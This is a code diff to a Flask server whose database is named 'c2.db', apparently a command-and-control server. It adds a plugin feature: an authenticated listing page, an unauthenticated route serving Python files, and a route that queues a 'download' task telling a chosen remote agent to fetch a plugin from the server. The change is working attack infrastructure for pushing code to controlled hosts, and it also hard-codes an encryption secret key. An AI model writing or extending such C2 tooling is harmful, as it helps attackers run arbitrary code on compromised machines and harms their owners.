@@ -21,6 +21,8 @@ DATABASE = "c2.db"
 SECRET_KEY = b'8zQ0wY9DwMZ5N63DR-3h9C7F5htGvA2I7ReG0i8ER6U='
 cipher = Fernet(SECRET_KEY)
 UPLOAD_FOLDER = 'upload'
+PLUGINS_DIR = "./plugins"
+os.makedirs(PLUGINS_DIR, exist_ok=True)
 os.makedirs(UPLOAD_FOLDER, exist_ok=True)
 app.config['UPLOAD_FOLDER'] = UPLOAD_FOLDER
 app.secret_key = SECRET_KEY
@@ -264,6 +266,45 @@ def uploads_list():
         return redirect(url_for("login"))
     files = [f for f in os.listdir(app.config['UPLOAD_FOLDER']) if os.path.isfile(os.path.join(app.config['UPLOAD_FOLDER'], f))]
     return render_template("uploads.html", files=files)
+
+@app.route('/plugins/')
+def plugins_list():
+    if "username" not in session:
+        return redirect(url_for("login"))
+    plugins = [f for f in os.listdir(PLUGINS_DIR) if f.endswith(".py")]
+    return render_template("plugins.html", plugins=plugins)
+
+
+@app.route("/plugins/<filename>")
+def serve_plugin(filename):
+    # Only allow .py files
+    if not filename.endswith(".py"):
+        return "Invalid file", 400
+    return send_from_directory(PLUGINS_DIR, filename)
+
+@app.route('/plugins/run', methods=['POST'])
+def run_plugin():
+    if "username" not in session:
+        return redirect(url_for("login"))
+
+    agent_id = request.form.get("agent_id")
+    plugin_name = request.form.get("plugin_name")
+    if not agent_id or not plugin_name:
+        return "Missing parameters", 400
+
+    # Construct the plugin URL that agent will download
+    plugin_url = f"{request.host_url}plugins/{plugin_name}"
+
+    # Insert task into tasks table
+    task_uuid = str(uuid.uuid4())
+    db = get_db()
+    db.execute("""
+        INSERT INTO tasks (uuid, agent_id, task_json, output)
+        VALUES (?, ?, ?, NULL)
+    """, (task_uuid, agent_id, json.dumps({"type": "download", "url": plugin_url})))
+    db.commit()
+
+    return redirect(url_for('plugins_list'))
 
 # --- Login / Logout ---
 @app.route("/login", methods=["GET", "POST"])
